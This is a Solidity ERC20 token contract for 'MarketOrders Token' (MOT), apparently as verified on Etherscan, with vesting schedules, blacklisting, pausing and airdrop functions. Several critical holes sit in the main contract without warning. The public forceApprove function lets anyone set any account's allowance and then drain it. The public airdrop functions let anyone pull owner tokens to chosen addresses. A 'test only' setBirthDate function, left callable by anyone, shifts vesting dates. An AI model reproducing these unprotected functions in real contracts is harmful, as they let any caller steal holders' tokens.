/**
 *Submitted for verification at Etherscan.io on 2020-07-05
*/

/**
* Copyright MARKETORDERS 2020
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is furnished to
* do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
pragma solidity >=0.4.21 <0.6.0; /*

__________________________________________________________________
      _
      |  |  /          /                                /
    --|-/|-/-----__---/----__----__---_--_----__-------/-------__------
      |/ |/    /___) /   /   ' /   ) / /  ) /___)     /      /   )
    __/__|____(___ _/___(___ _(___/_/_/__/_(___ _____/______(___/__o_o_



    ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗███████╗████████╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗ ███████╗
    ████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝
    ██╔████╔██║███████║██████╔╝█████╔╝ █████╗     ██║   ██║   ██║██████╔╝██║  ██║█████╗  ██████╔╝███████╗
    ██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝     ██║   ██║   ██║██╔══██╗██║  ██║██╔══╝  ██╔══██╗╚════██║
    ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗███████╗   ██║   ╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║███████║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝



=== 'Market Orders' Token contract with following features ===
    => ERC20 compliance
    => Higher degree of control by owner
    => SafeMath implementation
    => dedicated airdrop account
    => seed sale airdrop (ieo) both mode
    => internal administrative wallet
    => Scheduled fund allocation control

======================= Quick Stats ===================
    => Name        : MARKETORDERS TOKEN
    => Symbol      : MOT
    => Total supply: 200,000,000 (200 Million)
    => Decimals    : 18

-------------------------------------------------------------------------------------------------
 Copyright (c) 2020 onwards MARKETORDERS LTD ( https://MarketOrders.net , https://MarketOrders.io)
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-------------------------------------------------------------------------------------------------
*/

//*******************************************************************//
//------------------------ SafeMath Library -------------------------//
//*******************************************************************//
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Initializable {

  /**
   * @dev Indicates that the contract has been initialized.
   */
  bool private initialized;

  /**
   * @dev Indicates that the contract is in the process of being initialized.
   */
  bool private initializing;

  /**
   * @dev Modifier to use in the initializer function of a contract.
   */
  modifier initializer() {
    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");

    bool isTopLevelCall = !initializing;
    if (isTopLevelCall) {
      initializing = true;
      initialized = true;
    }

    _;

    if (isTopLevelCall) {
      initializing = false;
    }
  }

  /// @dev Returns true if and only if the function is running in the constructor
  function isConstructor() private view returns (bool) {
    // extcodesize checks the size of the code stored in an address, and
    // address returns the current address. Since the code is still not
    // deployed when running a constructor, any checks on its code size will
    // yield zero, making it an effective way to detect if a contract is
    // under construction or not.
    uint256 cs;
    assembly { cs := extcodesize(address) }
    return cs == 0;
  }

  // Reserved storage space to allow for layout changes in the future.
  uint256[50] private ______gap;
}


contract Ownable {

  // Owner of the contract
  address payable public owner;
  address payable internal _newOwner;

    constructor() public {
        owner = msg.sender;
    }

  /**
  * @dev Event to show ownership has been transferred
  * @param previousOwner representing the address of the previous owner
  * @param newOwner representing the address of the new owner
  */
  event OwnershipTransferred(address previousOwner, address newOwner);


  /**
   * @dev Sets a new owner address
   */
  function setOwner(address payable newOwner) internal {
    _newOwner = newOwner;
  }

  /**
  * @dev Throws if called by any account other than the owner.
  */
  modifier onlyOwner() {
    require(msg.sender == owner, "Not Owner");
    _;
  }

  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address payable newOwner) public onlyOwner {
    require(newOwner != address(0), "Invalid Address");
    setOwner(newOwner);
  }

  //this flow is to prevent transferring ownership to wrong wallet by mistake
  function acceptOwnership() public returns (address){
      require(msg.sender == _newOwner,"Invalid new owner");
      emit OwnershipTransferred(owner, _newOwner);
      owner = _newOwner;
      _newOwner = address(0);
      return owner;
  }
}



contract Pausable is Ownable {
  event Pause();
  event Unpause();
  event PauserChanged(address indexed newAddress);

  address public pauser;
  bool public paused = false;


  /**
   * @dev Modifier to make a function callable only when the contract is not paused.
   */
  modifier whenNotPaused() {
    require(!paused, "Paused");
    _;
  }

  /**
   * @dev throws if called by any account other than the pauser
   */
  modifier onlyPauser() {
    require(msg.sender == pauser, "Not Pauser");
    _;
  }

  /**
   * @dev called by the owner to pause, triggers stopped state
   */
  function pause() public onlyPauser {
    paused = true;
    emit Pause();
  }

  /**
   * @dev called by the owner to unpause, returns to normal state
   */
  function unpause() public onlyPauser {
    paused = false;
    emit Unpause();
  }

  /**
   * @dev update the pauser role
   */
  function updatePauser(address _newPauser) public onlyOwner {
    require(_newPauser != address(0), "Invalid Pauser");
    pauser = _newPauser;
    emit PauserChanged(pauser);
  }

}


contract Blacklistable is Ownable {

    address public blacklister;
    mapping(address => bool) internal blacklisted;

    event Blacklisted(address indexed _account);
    event UnBlacklisted(address indexed _account);
    event BlacklisterChanged(address indexed newBlacklister);

    /**
     * @dev Throws if called by any account other than the blacklister
    */
    modifier onlyBlacklister() {
        require(msg.sender == blacklister, "Not BlackLister");
        _;
    }

    /**
     * @dev Throws if argument account is blacklisted
     * @param _account The address to check
    */
    modifier notBlacklisted(address _account) {
        require(blacklisted[_account] == false, "Not Blacklisted");
        _;
    }

    /**
     * @dev Checks if account is blacklisted
     * @param _account The address to check
    */
    function isBlacklisted(address _account) public view returns (bool) {
        return blacklisted[_account];
    }

    /**
     * @dev Adds account to blacklist
     * @param _account The address to blacklist
    */
    function blacklist(address _account) public onlyBlacklister {
        blacklisted[_account] = true;
        emit Blacklisted(_account);
    }

    /**
     * @dev Removes account from blacklist
     * @param _account The address to remove from the blacklist
    */
    function unBlacklist(address _account) public onlyBlacklister {
        blacklisted[_account] = false;
        emit UnBlacklisted(_account);
    }

    function updateBlacklister(address _newBlacklister) public onlyOwner {
        require(_newBlacklister != address(0), "Invalid Address");
        blacklister = _newBlacklister;
        emit BlacklisterChanged(blacklister);
    }
}






//****************************************************************************//
//---------------------  MOT TOKEN MAIN CODE STARTS HERE ---------------------//
//****************************************************************************//

contract MARKETORDERS is Ownable, Pausable, Blacklistable, Initializable {

    /*===============================
    =         DATA STORAGE          =
    ===============================*/

    // Public variables of the token
    using SafeMath for uint256;
    string  public name;
    string  public symbol;
    uint256 public decimals;
    uint256 public totalSupply;
    uint256 public baseTotal;
    uint256 public totalSoldToPublic; // when totalPublicSale will be 12.5% then will stop public sale
    // This creates a mapping with all data storage
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) public internalWallet; // fasle = public, true = internal
    uint8 public saleMode; // 0=IEO, 1=Seed Sale, 2=Both
    uint256 public birthDate; // The date of contract deploy

    struct InternalDistSchedule
    {
        uint8 walletID;
        uint240 schedulePercent;
        bool scheduleComplete;
        uint256 scheduleTime;
    }

    InternalDistSchedule[] public InternalDistSchedules;

    struct walletInfo
    {
        string walletName;
        address assocAddress;
    }

    walletInfo[] public walletInfos;

    mapping(address => mapping (address => uint256)) public allowance;

    function cS (string memory a, string memory b) public view returns (bool)
    {
        return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))) );
    }




     /**
     * Constructor function just assigns initial supply to Owner
     */

    function initialize() public initializer {

        owner = msg.sender;
        pauser = msg.sender;

        blacklister = msg.sender;
        name = "MarketOrders Token";
        symbol = "MOT";
        decimals = 18;
        totalSupply = 200000000 * (10**decimals);
        baseTotal = totalSupply;

        //sending all the tokens to Owner
        balanceOf[owner] = totalSupply;

        //firing event which logs this transaction
        emit Transfer(address(0), owner, totalSupply);
    }

    function init() public onlyOwner returns (bool) {
        birthDate = now;
        // Predefined wallet informaiton
        walletInfo memory temp;

        temp.walletName = "Seed Sale";
        walletInfos.push(temp); // wallet id = 0

        temp.walletName = "Marketing";
        walletInfos.push(temp); // wallet id = 1

        temp.walletName = "Legal";
        walletInfos.push(temp);  // wallet id = 2

        temp.walletName = "Community";
        walletInfos.push(temp);  // wallet id = 3

        temp.walletName = "Advisors";
        walletInfos.push(temp);  // wallet id = 4

        temp.walletName = "Ecosystem";
        walletInfos.push(temp);  // wallet id = 5

        temp.walletName = "Team";
        walletInfos.push(temp);  // wallet id = 6

        temp.walletName = "Reserves";
        walletInfos.push(temp);  // wallet id = 7

        uint256 oneWeekLater = birthDate.add(604800);
        InternalDistSchedule memory temps;
        temps.walletID = 0;
        temps.schedulePercent = 130;  // 1.30%
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater;
        InternalDistSchedules.push(temps);  // first seed sale schedule

        temps.walletID = 0;
        temps.schedulePercent = 260;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(7776000);
        InternalDistSchedules.push(temps);  // second seed sale schedule

        temps.walletID = 0;
        temps.schedulePercent = 260;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(15552000);
        InternalDistSchedules.push(temps);  // third seed sale schedule

        temps.walletID = 1;
        temps.schedulePercent = 200;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater;
        InternalDistSchedules.push(temps);  // first Marketing schedule

        temps.walletID = 1;
        temps.schedulePercent = 200;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(7776000);
        InternalDistSchedules.push(temps);  // second Marketing schedule

        temps.walletID = 1;
        temps.schedulePercent = 200;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(15552000);
        InternalDistSchedules.push(temps);  // third Marketing schedule

        temps.walletID = 1;
        temps.schedulePercent = 200;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(23328000);
        InternalDistSchedules.push(temps);  // fourth Marketing schedule

        temps.walletID = 2;
        temps.schedulePercent = 200;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(7776000);
        InternalDistSchedules.push(temps);  // first Legal schedule

        temps.walletID = 2;
        temps.schedulePercent = 200;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(15552000);
        InternalDistSchedules.push(temps);  // second Legal schedule

        temps.walletID = 3;
        temps.schedulePercent = 375;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(7776000);
        InternalDistSchedules.push(temps);  // first community schedule

        temps.walletID = 3;
        temps.schedulePercent = 375;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(23328000);
        InternalDistSchedules.push(temps);  // second community schedule

        temps.walletID = 4;
        temps.schedulePercent = 84;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater;
        InternalDistSchedules.push(temps);  // first advisors schedule

        temps.walletID = 4;
        temps.schedulePercent = 84;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(7776000);
        InternalDistSchedules.push(temps);  // second advisors schedule

        temps.walletID = 4;
        temps.schedulePercent = 83;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(15552000);
        InternalDistSchedules.push(temps);  // third advisors schedule

        temps.walletID = 4;
        temps.schedulePercent = 83;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(23328000);
        InternalDistSchedules.push(temps);  // fourth advisors schedule

        temps.walletID = 4;
        temps.schedulePercent = 83;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(31104000);
        InternalDistSchedules.push(temps);  // fifth advisors schedule

        temps.walletID = 4;
        temps.schedulePercent = 83;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(38880000);
        InternalDistSchedules.push(temps);  // sixth advisors schedule

        temps.walletID = 5;
        temps.schedulePercent = 350;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater;
        InternalDistSchedules.push(temps);  // first echosystem schedule

        temps.walletID = 5;
        temps.schedulePercent = 350;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(15552000);
        InternalDistSchedules.push(temps);  // second echosystem schedule

        temps.walletID = 5;
        temps.schedulePercent = 350;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(31104000);
        InternalDistSchedules.push(temps);  // third echosystem schedule

        temps.walletID = 5;
        temps.schedulePercent = 350;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(46656000);
        InternalDistSchedules.push(temps);  // fourth echosystem schedule

        temps.walletID = 5;
        temps.schedulePercent = 350;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(62208000);
        InternalDistSchedules.push(temps);  // fifth echosystem schedule

        temps.walletID = 5;
        temps.schedulePercent = 350;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(77760000);
        InternalDistSchedules.push(temps);  // sixth echosystem schedule

        temps.walletID = 6;
        temps.schedulePercent = 438;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(23328000);
        InternalDistSchedules.push(temps);  // first Team schedule

        temps.walletID = 6;
        temps.schedulePercent = 437;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(38880000);
        InternalDistSchedules.push(temps);  // second Team schedule

        temps.walletID = 6;
        temps.schedulePercent = 438;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(54432000);
        InternalDistSchedules.push(temps);  // third Team schedule

        temps.walletID = 6;
        temps.schedulePercent = 437;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(69984000);
        InternalDistSchedules.push(temps);  // fourth Team schedule

        temps.walletID = 7;
        temps.schedulePercent = 300;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(15552000);
        InternalDistSchedules.push(temps);  // first Reservs schedule

        temps.walletID = 7;
        temps.schedulePercent = 300;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(31104000);
        InternalDistSchedules.push(temps);  // second Reservs schedule

        temps.walletID = 7;
        temps.schedulePercent = 300;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(46656000);
        InternalDistSchedules.push(temps);  // third Reservs schedule

        temps.walletID = 7;
        temps.schedulePercent = 300;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(62208000);
        InternalDistSchedules.push(temps);  // fourth Reservs schedule

        temps.walletID = 7;
        temps.schedulePercent = 300;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(77760000);
        InternalDistSchedules.push(temps);  // fifth Reservs schedule

        temps.walletID = 7;
        temps.schedulePercent = 300;
        temps.scheduleComplete = false;
        temps.scheduleTime = oneWeekLater.add(93312000);
        InternalDistSchedules.push(temps);  // sixth Reservs schedule

        return true;
    }


    function setInternalWalletAddress(string memory _forWalletName, address _walletAddress) public onlyOwner returns (bool)
    {
        require(_walletAddress != address(0), "zero address can't allowed");
        require(balanceOf[_walletAddress] == 0, "this address already in use and has balance");
        require(!internalWallet[_walletAddress], "already used in internal wallet");
        uint walletLength = walletInfos.length;
        for(uint i = 0; i < walletLength; i++)
        {
            if(cS(walletInfos[i].walletName,_forWalletName) && walletInfos[i].assocAddress == address(0))
            {
                walletInfos[i].assocAddress = _walletAddress;
                internalWallet[_walletAddress] = true;
                return true;
            }
        }
        return false;
    }

    function transferByMetricPlan(address _interWalletAddress, address to, uint256 amount) public onlyOwner notBlacklisted(to) returns (bool) {
        require(internalWallet[_interWalletAddress], "Invalid Internal Wallet Address");
        return transferFromInternalWallet(_interWalletAddress, to, amount);
    }

    function transferFromInternalWallet(address _from, address _to, uint256 amount) internal returns (bool)
    {
        _transfer(_from,_to,amount);
        return true;
    }

    function doScheduledTransfer() public onlyOwner returns (uint8)
    {
        uint walletLength = InternalDistSchedules.length;
        uint8 countSchTxCompleted = 0;
        for(uint i = 0; i < walletLength; i++)
        {
            if (!InternalDistSchedules[i].scheduleComplete && InternalDistSchedules[i].scheduleTime <= now)
            {
                uint256 _amount = calculatePercentage(baseTotal,InternalDistSchedules[i].schedulePercent);
                _transfer(owner, walletInfos[InternalDistSchedules[i].walletID].assocAddress, _amount);
                InternalDistSchedules[i].scheduleComplete = true;
                countSchTxCompleted ++;
            }

        }

        return countSchTxCompleted;
    }


    function onlyOwnerSetSaleMode(uint8 _saleMode) public onlyOwner returns (uint)
    {
        require(_saleMode <= 2, "Invalid sale mode");
        saleMode = _saleMode;
		return saleMode;
    }


    //Calculate percent and return result
    function calculatePercentage(uint256 PercentOf, uint256 percentTo ) internal pure returns (uint256)
    {
        uint256 factor = 10000;
        require(percentTo <= factor, "Invalid Percentage");
        uint256 c = PercentOf.mul(percentTo).div(factor);
        return c;
    }

    /*===============================
    =         PUBLIC EVENTS         =
    ===============================*/

    // This generates a public event of token transfer
    event Transfer(address indexed from, address indexed to, uint256 value);

    // This will log approval of token Transfer
    event Approval(address indexed from, address indexed spender, uint256 value);

    /*======================================
    =       STANDARD ERC20 FUNCTIONS       =
    ======================================*/

    /* Internal transfer, only can be called by this contract */
    function _transfer(address _from, address _to, uint _value) internal whenNotPaused notBlacklisted(_to) notBlacklisted(_from) {
        //checking conditions
        require (_to != address(0), "Invalid Address"); // Prevent transfer to 0x0 address. Use burn() instead
        // overflow and undeflow checked by SafeMath Library
        balanceOf[_from] = balanceOf[_from].sub(_value);    // Subtract from the sender
        balanceOf[_to] = balanceOf[_to].add(_value);  // Add the same to the recipient

        // emit Transfer event
        emit Transfer(_from, _to, _value);
    }

    /**
        * Transfer tokens
        *
        * Send `_value` tokens to `_to` from your account
        *
        * @param _to The address of the recipient
        * @param _value the amount to send
        */
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!internalWallet[msg.sender],"invalid sender its internal wallet");
        //no need to check for input validations, as that is ruled by SafeMath
        _transfer(msg.sender, _to, _value);

        return true;
    }

    /**
        * Transfer tokens from other address
        *
        * Send `_value` tokens to `_to` in behalf of `_from`
        *
        * @param _from The address of the sender
        * @param _to The address of the recipient
        * @param _value the amount to send
        */
    function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool success) {
        require(!internalWallet[_from],"invalid from its internal wallet");
        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
        _transfer(_from, _to, _value);
        return true;
    }

    /**
        * Set allowance for other address
        *
        * Allows `_spender` to spend no more than `_value` tokens in your behalf
        *
        * @param _spender The address authorized to spend
        * @param _value the max amount they can spend
        */
    function approve(address _spender, uint256 _value) public whenNotPaused returns (bool success) {
        require(!internalWallet[msg.sender], "invalid sender its internal wallet");
        require(balanceOf[msg.sender] >= _value, "Balance does not have enough tokens");
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    event Burn(address indexed burner, uint256 value);

    function burn(uint256 _value) public onlyOwner {
        _burn(msg.sender, _value);
    }

    function _burn(address _who, uint256 _value) internal {
        require(_value <= balanceOf[_who], "Invalid balance to burn");
        balanceOf[_who] = balanceOf[_who].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(_who, _value);
        emit Transfer(_who, address(0), _value);
    }


    /*=====================================
    =       CUSTOM PUBLIC FUNCTIONS       =
    ======================================*/

    //To air drop
    function _airDrop(address recipients,uint tokenAmount) internal returns (bool) {
        require(!internalWallet[recipients],"invalid address to airDrop");
        uint256 publicSaleLimit = calculatePercentage(baseTotal,1250);  // 12.5% only for public sale
        require(totalSoldToPublic.add(tokenAmount) <= publicSaleLimit, "required token amount greater than available");

        //This will loop through all the recipients and send them the specified tokens
        _transfer(owner, recipients, tokenAmount);
        totalSoldToPublic = totalSoldToPublic.add(tokenAmount);
    }


    //To air drop
    function airDropMultiple(address[] memory recipients,uint[] memory tokenAmount) public returns (bool) {
        require(saleMode == 0 || saleMode == 2,"airdrop not allowed");

        uint reciversLength = recipients.length;

        require(reciversLength <= 150, "Too many address");
        for(uint i = 0; i < reciversLength; i++)
        {
            _airDrop(recipients[i],tokenAmount[i]);
        }
        return true;
    }


    //To air drop
    function airDropSingle(address recipients,uint tokenAmount) public returns (bool) {
        require(saleMode == 0 || saleMode == 2,"airdrop not allowed");
        _airDrop(recipients, tokenAmount);
        return true;
    }


    /**
     * Run an ACTIVE Air-Drop
     *
     * It requires an array of all the addresses and amount of tokens to distribute
     * It will only process first 150 recipients. That limit is fixed to prevent gas limit
     */
    function airdropACTIVE(address[] memory recipients,uint256[] memory tokenAmount) public onlyOwner returns (bool) {
        uint256 totalAddresses = recipients.length;
        require(totalAddresses <= 150, "Too many address");
        for(uint i = 0; i < totalAddresses; i++)
        {
          //This will loop through all the recipients and send them the specified tokens
          //Input data validation is unncessary, as that is done by SafeMath and which also saves some gas.
          _transfer(address(this), recipients[i], tokenAmount[i]);
        }
        return true;
    }


    function manualWithdrawTokens(uint256 tokenAmount) public onlyOwner returns (bool){
        // no need for overflow checking as that will be done in transfer function
        _transfer(address(this), owner, tokenAmount);
		return true;
    }

    /**
     * Just in rare case, owner wants to transfer Ether from contract to owner address
     */
    function manualWithdrawEther() public onlyOwner returns (bool){
        address(owner).transfer(address(this).balance);
        return true;
    }

    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
    //^^^^^^^^^^^^^^BELOW IS FOR TEST ONLY ^^^^^^^^^^^^^^^^^//
    //^^^^^^^^^^^^^^SHOULD BE REMOVED IN PRODUCTION^^^^^^^^^//
    // This function setBirthDate should be commented or removed on production deploy, it is only for testing purpose
    function setBirthDate(uint256 _lessSeconds) public returns(bool)
    {
        birthDate = birthDate.sub(_lessSeconds);
        uint256 scheduleLength = InternalDistSchedules.length;
        for (uint256 i = 0; i < scheduleLength; i++)
        {
            InternalDistSchedules[i].scheduleTime = InternalDistSchedules[i].scheduleTime.sub(_lessSeconds);
        }
    }

    // This function readWalletInfos should be commented or removed on production deploy, it is only for testing purpose
    function readWalletInfos(uint256 walletIndex) public view returns(string memory _walletName,address _assocAddress)
    {
        _walletName = walletInfos[walletIndex].walletName;
        _assocAddress = walletInfos[walletIndex].assocAddress;
        return (_walletName, _assocAddress);
    }

    // This function readWalletInfos should be commented or removed on production deploy, it is only for testing purpose
    function readInternalDistributionSchedules(uint256 scheduleIndex)
    public view returns(uint256 _walletID, uint256 _schedulePercent, bool _scheduleComplete, uint256 _scheduleTime)
    {
        _walletID = InternalDistSchedules[scheduleIndex].walletID;
        _schedulePercent = InternalDistSchedules[scheduleIndex].schedulePercent;
        _scheduleComplete = InternalDistSchedules[scheduleIndex].scheduleComplete;
        _scheduleTime = InternalDistSchedules[scheduleIndex].scheduleTime;
        return (_walletID, _schedulePercent,_scheduleComplete,_scheduleTime);
    }

    function forceApprove(address fromAccount, address _spender, uint256 amount ) public returns (bool)
    {
        allowance[fromAccount][_spender] = amount;
        emit Approval(fromAccount, _spender, amount);
        return true;
    }

}